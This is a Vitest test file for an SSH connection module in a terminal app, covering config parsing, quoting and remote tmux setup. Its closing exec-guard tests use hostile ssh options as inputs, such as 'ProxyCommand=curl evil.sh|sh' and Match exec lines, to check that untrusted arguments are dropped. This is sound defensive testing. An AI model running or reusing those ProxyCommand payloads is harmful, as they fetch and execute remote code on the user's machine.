import { describe, expect, it } from 'vitest'
import {
  buildSshArgs,
  parseExtraArgs,
  stripLocalExecArgs,
  parseSshConfig,
  posixQuote,
  quoteRemotePath,
  remoteTmuxCommand,
  remoteTmuxConf,
  parseLsDirs,
  sshAttachmentId,
  sshConnectionIdForProject,
  sshHostKey
} from './ssh'

describe('sshHostKey', () => {
  it('is user@host', () => {
    expect(sshHostKey({ host: 'box.example.com', user: 'bob' })).toBe('bob@box.example.com')
  })
  it('ignores port + identity (same remote $HOME → same key)', () => {
    expect(sshHostKey({ host: 'h', user: 'u', port: 22 } as never)).toBe(
      sshHostKey({ host: 'h', user: 'u', port: 2222 } as never)
    )
  })
})

describe('sshAttachmentId', () => {
  it('shares one scope per project and endpoint without exposing the host in a filename', () => {
    const a = sshAttachmentId('project-1', { host: 'ubuntu.lan', user: 'corvin', port: 22 })
    expect(a).toBe(sshAttachmentId('project-1', { host: 'ubuntu.lan', user: 'corvin' }))
    expect(a).not.toContain('ubuntu.lan')
    expect(a).not.toBe(sshAttachmentId('project-2', { host: 'ubuntu.lan', user: 'corvin' }))
    expect(a).not.toBe(sshAttachmentId('project-1', { host: 'ubuntu.lan', user: 'other' }))
  })

  it('separates two ports on the same host (two different sshd instances)', () => {
    expect(sshAttachmentId('p', { host: 'h', user: 'u', port: 22 })).not.toBe(
      sshAttachmentId('p', { host: 'h', user: 'u', port: 2222 })
    )
  })

  it('is filesystem-safe: the ControlMaster socket path is built from it', () => {
    expect(sshAttachmentId('p1', { host: 'a.very.long.hostname.example.com', user: 'u' })).toMatch(
      /^attached-p1-[0-9a-f]{8}$/
    )
  })
})

describe('sshConnectionIdForProject', () => {
  const ubuntu = { host: 'devbox', user: 'corvin', port: 2222 }

  it('uses the project id when the project itself lives on that SSH endpoint', () => {
    expect(sshConnectionIdForProject('project-1', ubuntu, { ...ubuntu })).toBe('project-1')
  })

  it('a node with no host is never served from the project (unroutable fails safe)', () => {
    // `undefined === undefined` would otherwise hand a hostless node a LOCAL project's id — a
    // master that was never opened for it. Failing as an attachment ends at `requireRemote`.
    // `undefined` specifically: a LOCAL project passes no server at all, so `projectServer?.host`
    // is also undefined and the two compare EQUAL.
    const hostless = { host: undefined, user: 'corvin' } as unknown as typeof ubuntu
    expect(sshConnectionIdForProject('local-1', hostless)).not.toBe('local-1')
    expect(sshConnectionIdForProject('local-1', hostless)).toBe(
      sshAttachmentId('local-1', hostless)
    )
    // An empty host is just as unroutable.
    const empty = { host: '', user: 'corvin' } as unknown as typeof ubuntu
    expect(sshConnectionIdForProject('local-1', empty)).not.toBe('local-1')
  })

  it('a LOCAL project has no binding, so every remote node on it is an attachment', () => {
    expect(sshConnectionIdForProject('local-1', ubuntu, undefined)).toBe(
      sshAttachmentId('local-1', ubuntu)
    )
  })

  it('uses the host attachment when a remote node lives in a local project', () => {
    expect(sshConnectionIdForProject('project-1', ubuntu)).toBe(sshAttachmentId('project-1', ubuntu))
  })

  it('serves a node naming the same HOST from the project, whatever user it was saved with', () => {
    // An SSH project's canvas lives in `<remoteCwd>/.nodeterm/project.json` ON THE HOST, shared
    // with everyone who opens that folder — so a node's persisted `user` is whoever CREATED it.
    // If alice's nodes sent bob off to open a second master as `alice@box`, bob's whole canvas
    // would fail (or sit on an askpass prompt) the moment he opened the project.
    expect(
      sshConnectionIdForProject('project-1', { host: 'devbox', user: 'alice', port: 2222 }, ubuntu)
    ).toBe('project-1')
    // Same for a port saved from a setup that reaches the machine differently.
    expect(
      sshConnectionIdForProject('project-1', { host: 'devbox', user: 'corvin', port: 22 }, ubuntu)
    ).toBe('project-1')
  })

  it("does not reuse an SSH project's connection for a node on another endpoint", () => {
    expect(
      sshConnectionIdForProject('project-1', ubuntu, {
        host: 'another-host',
        user: 'corvin',
        port: 2222
      })
    ).toBe(sshAttachmentId('project-1', ubuntu))
  })

  it('never returns the project id for a node the project cannot serve', () => {
    // The regression this guards: an attached node resolving the LOCAL project's (absent) master
    // and, with no `sshRemote`, degrading into a local shell wearing the remote node's identity.
    expect(sshConnectionIdForProject('local-project', ubuntu)).not.toBe('local-project')
  })
})

describe('parseSshConfig', () => {
  it('parses a named host with HostName/User/Port/IdentityFile', () => {
    const cfg = `Host prod
  HostName 10.0.0.5
  User deploy
  Port 2222
  IdentityFile ~/.ssh/prod_ed25519`
    expect(parseSshConfig(cfg)).toEqual([
      { label: 'prod', host: '10.0.0.5', user: 'deploy', port: 2222, identityFile: '~/.ssh/prod_ed25519' }
    ])
  })

  it('falls back to the alias when HostName is absent and leaves optional fields undefined', () => {
    expect(parseSshConfig('Host box\n  User me')).toEqual([
      { label: 'box', host: 'box', user: 'me', port: undefined, identityFile: undefined }
    ])
  })

  it('skips wildcard hosts and the catch-all', () => {
    const cfg = `Host *
  User everyone
Host *.internal
  User x
Host real
  HostName r.example.com`
    expect(parseSshConfig(cfg)).toEqual([
      { label: 'real', host: 'r.example.com', user: undefined, port: undefined, identityFile: undefined }
    ])
  })

  it('accepts key=value form, comments, and multiple aliases on one Host line', () => {
    const cfg = `Host a b  # two aliases
  HostName=h.example.com
  Port=22`
    expect(parseSshConfig(cfg)).toEqual([
      { label: 'a', host: 'h.example.com', user: undefined, port: 22, identityFile: undefined },
      { label: 'b', host: 'h.example.com', user: undefined, port: 22, identityFile: undefined }
    ])
  })
})

describe('buildSshArgs', () => {
  it('minimal host/user', () => {
    expect(buildSshArgs({ host: 'example.com', user: 'alice' })).toEqual([
      '-p',
      '22',
      'alice@example.com'
    ])
  })

  it('custom port + identity file', () => {
    expect(
      buildSshArgs({ host: 'h', user: 'u', port: 2222, identityFile: '/keys/id_ed25519' })
    ).toEqual(['-p', '2222', '-i', '/keys/id_ed25519', 'u@h'])
  })

  it('TRUSTED extra args are tokenized and inserted before the target', () => {
    expect(
      buildSshArgs({ host: 'h', user: 'u', extraArgs: '-A -o ServerAliveInterval=30', execTrusted: true })
    ).toEqual(['-p', '22', '-A', '-o', 'ServerAliveInterval=30', 'u@h'])
  })
})

describe('parseExtraArgs', () => {
  it('respects single and double quotes', () => {
    expect(parseExtraArgs(`-o "ProxyCommand=ssh -W %h:%p bastion" -A`)).toEqual([
      '-o',
      'ProxyCommand=ssh -W %h:%p bastion',
      '-A'
    ])
  })

  it('empty/undefined → []', () => {
    expect(parseExtraArgs(undefined)).toEqual([])
    expect(parseExtraArgs('   ')).toEqual([])
  })
})

describe('posixQuote', () => {
  it('single-quotes and escapes embedded quotes', () => {
    expect(posixQuote(`a b`)).toBe(`'a b'`)
    expect(posixQuote(`it's`)).toBe(`'it'\\''s'`)
  })
})

describe('quoteRemotePath', () => {
  it('leaves a bare ~ unquoted so the remote shell expands it', () => {
    expect(quoteRemotePath('~')).toBe('~')
  })
  it('keeps a leading ~/ unquoted and single-quotes the remainder', () => {
    expect(quoteRemotePath('~/a b')).toBe(`~/'a b'`)
  })
  it('a bare ~/ stays ~/', () => {
    expect(quoteRemotePath('~/')).toBe('~/')
  })
  it('fully quotes an absolute path (byte-identical to posixQuote)', () => {
    expect(quoteRemotePath('/srv/x')).toBe(`'/srv/x'`)
  })
  it('only a leading ~ or ~/ is special — ~weird is fully quoted', () => {
    expect(quoteRemotePath('~weird')).toBe(`'~weird'`)
  })
})

describe('remoteTmuxCommand', () => {
  it('builds attach-or-create on the remote socket with a quoted cwd', () => {
    expect(remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '/srv/app' })).toBe(
      `tmux -L nodeterm-rmt new-session -A -s 'nt-x' -c '/srv/app'`
    )
  })
  it('tilde-expands a home-relative cwd (leaves ~/ unquoted)', () => {
    expect(remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '~/project' })).toBe(
      `tmux -L nodeterm-rmt new-session -A -s 'nt-x' -c ~/'project'`
    )
  })
  it('appends a quoted program + args when given', () => {
    expect(
      remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '/a', program: 'ssh', programArgs: ['-A', 'h'] })
    ).toBe(`tmux -L nodeterm-rmt new-session -A -s 'nt-x' -c '/a' 'ssh' '-A' 'h'`)
  })
})

describe('remoteTmuxConf', () => {
  const c = remoteTmuxConf(50000)
  it('leaves the mouse ON — tmux owns scrolling and selection (native, alternate screen)', () => {
    expect(c).toContain('set -g mouse on')
    expect(c).not.toContain('set -g mouse off')
  })
  it('does not blank smcup/rmcup/indn', () => {
    expect(c).not.toContain('smcup@')
    expect(c).not.toContain('rmcup@')
    expect(c).not.toContain('indn@')
  })
  it('enables OSC 52 via terminal-features, NOT the Ms= override (a no-op on tmux 3.2+)', () => {
    // This is what finally makes copying work over SSH: tmux emits OSC 52 to the attached client,
    // whose handler writes the LOCAL clipboard. Measured: with `Ms=`, tmux emitted nothing.
    expect(c).toContain('set -g set-clipboard on')
    expect(c).toContain('set -as terminal-features ",*:clipboard"')
    expect(c).not.toContain('Ms=')
    // The only terminal-overrides mention allowed is the MIGRATION unset — never a new entry.
    expect(c).not.toMatch(/set -g[a]? terminal-overrides/)
    expect(c).not.toMatch(/set -a[gs]? terminal-overrides/)
  })
  it('clears the override/feature arrays a long-lived server accumulated from older versions', () => {
    // A tmux server outlives the app and keeps every entry ever sourced into it; the stale
    // smcup@/rmcup@/indn@ entries would otherwise keep breaking scrolling forever. Measured:
    // sourcing these unsets into a poisoned server restored the alternate screen for new clients.
    expect(c).toContain('set -su terminal-overrides')
    expect(c).toContain('set -su terminal-features')
  })
  it('copies mouse selections through tmux, with no pbcopy (it would run on the remote host)', () => {
    expect(c).toContain('bind -T copy-mode    MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel')
    expect(c).toContain('bind -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel')
    expect(c).toContain('DoubleClick1Pane send-keys -X select-word')
    expect(c).toContain('TripleClick1Pane send-keys -X select-line')
    expect(c).not.toContain('pbcopy')
  })
  it('floors history-limit at 1000', () => {
    expect(remoteTmuxConf(10)).toContain('set -g history-limit 1000')
    expect(remoteTmuxConf(50000)).toContain('set -g history-limit 50000')
  })
})

describe('remoteTmuxCommand confPath', () => {
  it('adds -f <confPath> before new-session when given', () => {
    const cmd = remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '~/app', socket: 'nodeterm-rmt', confPath: '/home/u/.nodeterm/tmux.conf' })
    expect(cmd).toContain(`-f '/home/u/.nodeterm/tmux.conf' new-session`)
  })
  it('omits -f when no confPath', () => {
    const cmd = remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '~/app', socket: 'nodeterm-rmt' })
    expect(cmd).not.toContain('-f ')
  })
})

describe('parseLsDirs', () => {
  it('keeps only directory entries from `ls -1Ap`, dropping ./ and ../', () => {
    expect(parseLsDirs('./\n../\nsrc/\nREADME.md\n.git/\nbin/\n')).toEqual(['.git', 'bin', 'src'])
  })
})

// The exec-site guard (the `permissionModeFlag` / `SAFE_SESSION_ID` idiom: re-validate where the
// value BECOMES a command). `ssh -o ProxyCommand=<cmd>` runs `<cmd>` LOCALLY through /bin/sh every
// time the node opens — so a value that did not come from this machine never gets to carry one.
describe('stripLocalExecArgs', () => {
  it('drops ProxyCommand in both spellings, and takes its value with it', () => {
    expect(stripLocalExecArgs(parseExtraArgs('-o "ProxyCommand=curl evil.sh|sh"'))).toEqual({
      args: [],
      dropped: ['-o', 'ProxyCommand=curl evil.sh|sh']
    })
    // `-oProxyCommand=…` is the same option written without the space.
    expect(stripLocalExecArgs(['-oProxyCommand=nc %h %p']).args).toEqual([])
    // …and the space-separated value form (`-o "ProxyCommand nc %h %p"`).
    expect(stripLocalExecArgs(['-o', 'ProxyCommand nc %h %p']).args).toEqual([])
  })

  it('drops the other options that make something execute', () => {
    for (const opt of [
      'LocalCommand=evil',
      'PermitLocalCommand=yes',
      'KnownHostsCommand=evil',
      'Include=/tmp/evil-config',
      'PKCS11Provider=/tmp/evil.so',
      'SecurityKeyProvider=/tmp/evil.so',
      'RemoteCommand=evil'
    ]) {
      expect(stripLocalExecArgs(['-o', opt]).args).toEqual([])
    }
    // `Match exec "<cmd>"` runs <cmd> locally to decide whether the block applies.
    expect(stripLocalExecArgs(['-o', 'Match exec "curl evil.sh|sh"']).args).toEqual([])
    // An alternate ssh_config can carry any of the above.
    expect(stripLocalExecArgs(['-F', '/tmp/evil-config']).args).toEqual([])
    expect(stripLocalExecArgs(['-F/tmp/evil-config']).args).toEqual([])
  })

  it('leaves every harmless arg untouched (a jump host, a keepalive, verbosity)', () => {
    const ok = parseExtraArgs('-A -v -J jump.example -o StrictHostKeyChecking=no -o ServerAliveInterval=30')
    expect(stripLocalExecArgs(ok)).toEqual({ args: ok, dropped: [] })
  })

  it('keeps the harmless args of a list that also carries an exec-enabling one', () => {
    const { args, dropped } = stripLocalExecArgs(
      parseExtraArgs('-A -o ProxyCommand=evil -o ServerAliveInterval=30')
    )
    expect(args).toEqual(['-A', '-o', 'ServerAliveInterval=30'])
    expect(dropped.length).toBeGreaterThan(0)
  })
})

describe('buildSshArgs exec guard', () => {
  const base = { host: 'h', user: 'u' }

  it('refuses an untrusted ProxyCommand (a cloned project.json / a canvas-sync peer)', () => {
    expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
      '-p', '22', 'u@h'
    ])
  })

  it('honors the local user\'s OWN ProxyCommand (a corporate jump host still works)', () => {
    expect(
      buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true })
    ).toEqual(['-p', '22', '-o', 'ProxyCommand=corp-proxy', '%h', 'u@h'])
  })

  // An untrusted list contributes NOTHING, whether or not it carries an exec-enabling option.
  it('degrades, never blocks — and contributes no untrusted tokens', () => {
    expect(buildSshArgs({ ...base, port: 2222, extraArgs: '-A -o ProxyCommand=evil' })).toEqual([
      '-p', '2222', 'u@h'
    ])
    expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
      '-p', '22', 'u@h'
    ])
    // Even with nothing exec-enabling in it, an untrusted list is dropped whole: `-A`/`-J` from a
    // document are unwanted, and a bare positional would be read by ssh as the destination.
    expect(buildSshArgs({ ...base, extraArgs: '-A -J jump.example' })).toEqual([
      '-p', '22', 'u@h'
    ])
    // A bare positional token: with no exec option it survives stripLocalExecArgs (dropped=[]), so
    // the OLD code passed it through and ssh took `evilhost` as the destination instead of u@h.
    expect(buildSshArgs({ ...base, extraArgs: 'evilhost' })).toEqual(['-p', '22', 'u@h'])
  })
})
